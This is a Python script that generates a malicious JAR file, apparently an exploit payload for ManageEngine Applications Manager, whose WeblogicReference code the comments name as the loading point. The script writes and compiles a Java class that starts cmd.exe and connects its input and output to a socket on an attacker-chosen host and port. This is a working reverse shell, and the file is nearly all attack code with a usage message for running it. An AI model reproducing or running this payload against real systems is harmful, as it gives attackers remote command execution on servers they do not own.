import shutil
import subprocess
import os
import sys

def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

def create_jar(command,jarname,revhost,revport):
    print("[*] Creating JAR file...")
    # Variables
    classname = "Environment"
    pkgname = jarname + ".jndi"
    fullname = pkgname + "." + classname
    manifest = "MANIFEST.MF"

    # Directory variables
    curdir = os.getcwd()
    metainf_dir = "META-INF"
    maindir = jarname
    subdir = maindir + "/jndi"
    builddir = curdir + "/" + subdir
    print(builddir)

    # Check if directory exist, else create directory
    try:
        if os.path.isdir(builddir):
            pass
        else:
            os.makedirs(builddir)
    except OSError:
        print("[!] Error creating local directory \"" + builddir + "\", check permissions...")
        exit(-1)

    # Creating the text file using given parameters
    javafile = '''package ''' + pkgname + ''';
    
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.OutputStream;
    import java.net.Socket;
    import java.util.concurrent.TimeUnit;
    
    public class ''' + classname + ''' {
      
      // This method is being called by lookupMBeanServer() in com/adventnet/appmanager/server/wlogic/statuspoll/WeblogicReference.java
      // Uses the jarLoader.loadClass() method to load and initiate a new instance via newInstance()
      public void setProviderUrl(String string) throws Exception {
        System.out.println("Hello from setProviderUrl()");
        connect();
      }
    
      // Normal main() entry
      public static void main(String args[]) throws Exception {
        System.out.println("Hello from main()");
        // Added delay to notice being called from main()
        TimeUnit.SECONDS.sleep(10);
        connect();
      }
    
      // Where the magic happens
      public static void connect() throws Exception {
        String host = "''' + revhost + '''";
        int port = ''' + str(revport) + ''';
        String[] cmd = {"''' + command + '''"};
    
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
          while(pi.available()>0)
            so.write(pi.read());
          while(pe.available()>0)
            so.write(pe.read());
          while(si.available()>0)
            po.write(si.read());
          so.flush();
          po.flush();
          
          try {
            p.exitValue();
            break;
          }
          catch (Exception e){
          }
    
        };
        p.destroy();
        s.close();
      }
    
    }'''
    
    # Output file to desired directory
    os.chdir(builddir)
    print(javafile,file=open(classname + ".java","w"))

    # Go to previous directory to create JAR file
    os.chdir(curdir)

    # Create the compiled .class file
    cmdCompile = "javac --release 7 " + subdir + "/*.java"
    process = subprocess.call(cmdCompile,shell=True)
    
    # Creating Manifest file
    try:
        if os.path.isdir(metainf_dir):
            pass
        else:
            os.makedirs(metainf_dir)
    except OSError:
        print("[!] Error creating local directory \"" + metainf_dir + "\", check permissions...")
        exit(-1)
    print("Main-Class: " + fullname,file=open(metainf_dir + "/" + manifest,"w"))
    print("jar cmvf " + metainf_dir + "/" + manifest + " " + jarname + ".jar" + " " + subdir + "/*.class")
    
    # Create JAR file
    cmdJar = "jar cmvf " + metainf_dir + "/" + manifest + " " + jarname + ".jar" + " " + subdir + "/*.class"
    process = subprocess.call(cmdJar,shell=True)

    # Cleanup directories
    try:
        shutil.rmtree(metainf_dir)
        shutil.rmtree(maindir)
    except:
        print("[!] Error while cleaning up directories.")
    return True

    # Main
def main(argv):
    if len(sys.argv) == 4:
        revhost = sys.argv[1]
        revport = sys.argv[2]
        jarname = sys.argv[3].strip()
    else:
        print("[*] Usage: " + sys.argv[0] + " <reverse_shell_host> <reverse_shell_port> <jarname>")
        print("[*] Example: " + sys.argv[0] + " 192.168.252.14 6666 test\n")
        exit(0)

   
    try:
        # Command shell to use
        # cmd.exe for windows, bin/sh for linux
        cmd = "cmd.exe"

        # Execute functions
        create_jar(cmd,jarname,revhost,revport)
    except KeyboardInterrupt:
        keyboard_interrupt()

if __name__ == "__main__":
    main(sys.argv[1:])
